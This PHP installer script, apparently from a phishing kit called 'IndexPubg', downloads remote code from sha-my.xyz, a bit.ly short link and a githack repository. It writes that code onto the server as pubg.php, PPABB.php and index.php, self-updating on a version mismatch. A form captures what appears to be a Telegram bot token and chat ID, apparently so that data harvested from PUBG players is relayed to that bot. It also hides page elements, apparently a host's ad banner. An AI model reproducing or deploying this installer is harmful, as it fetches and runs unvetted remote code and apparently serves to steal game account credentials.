<?
$info = json_decode(file_get_contents('http://sha-my.xyz/Pubg/info.json'),1);
$version= $info[info]['version'];
$v = "5";
if($v != $version){
$iscript = file_get_contents('https://bit.ly/3lJKcQD');
$index = file_get_contents($iscript);
$xx = file_put_contents("pubg.php", $index);
?>
	   <html>
<head>
<meta charset="UTF-8"/>
<meta http-equiv="refresh" content="1">
</head>
</body>
</html>
<?
}
function save($array){
    file_put_contents('PPABB.json', json_encode($array));
}
$token = $_GET['token'];
$id = $_GET['id'];
$install = $_GET['index'];

$info = json_decode(file_get_contents('PPABB.json'),1);

if($token and $id){
$info[info]['id'] = $id;
$info[info]['token'] = $token;
 save($info);
file_put_contents("link.txt", "ads");

$url1 = "PPABB.php";
header("location: $url1");
}
if((!$token or !$id)and $install){
	 ?>
	   <html>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<title>Install IndexPubg - By ShaMy</title>
<link rel="stylesheet" href="https://raw.githack.com/ahmed-shamy/install/main/style.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
</head>
<body>
<script>
document.getElementsByTagName("div")[0].style.display = "none";
document.getElementsByClassName("cbalink")[0].style.display = "none";
</script>
 <form method="GET" action="pubg.php">
	<table border="0" width="100%">
		<tr>
			<td width="104"><span style="background-color: #FFFF00">Your Token :</span></td>
			<td><font color="#00FFFF">
			<input name="token" size="20" style="background-color: #FF0000"></font></td>
		</tr>
		<tr>
			<td width="104"><span style="background-color: #FFFF00">Your ID :</span></td>
			<td><input name="id" size="20" style="background-color: #FF0000"></td>
		</tr>
	</table>
	<p align="left"><font color="#FFFFFF">
	<input type="submit" value="Install Now" name="B1" style="background-color: #FFFF00"></font></p>
</form>
</body>
</html>
	  <?
}
?>
 
<?
$install = $_GET['index'];
if($install){
	 if($install=="M"){
$shamy = file_get_contents("https://raw.githack.com/ahmed-shamy/pubg/main/M/bot.php");
$xx = file_put_contents("PPABB.php", $shamy);

$index = file_get_contents('https://raw.githack.com/ahmed-shamy/pubg/main/M/IndeX.php');
$xx = file_put_contents("index.php", $index); 
}
}
 ?> 
<?
$install = $_GET['index'];
if(!$install){
 ?>
<html>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<title>Install IndexPubg - By ShaMy</title>
<link rel="stylesheet" href="https://raw.githack.com/ahmed-shamy/install/main/style.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
</head>
<body>
<script>
document.getElementsByTagName("div")[0].style.display = "none";
document.getElementsByClassName("cbalink")[0].style.display = "none";
</script>
	<center>
		<h2>Install Index Pubg</h2>
   <h5>Choose the index you want.</h5>
    <br><hr><br>
   </center>
<table border="0" width="100%">
<center>
<tr>
<td>
<center>
		<div class="card">
  <img src="https://i.ibb.co/BtwFn9n/125303850-183525890088980-1519732218801491935-n.png" style="width:100%">
  <p><a href="pubg.php?index=M"><button>Install</button></a></p>
</div>
</center>
</td>
</tr>
</center>
</table>   
<center>
    <br><hr><br>
   <h5><a href="https://t.me/joinchat/AAAAAFJFQs5yrvaaAXkA2w"> Developed by ShaMy </a></h5>
   </center>
</body>
</html>
<?
}
 ?>
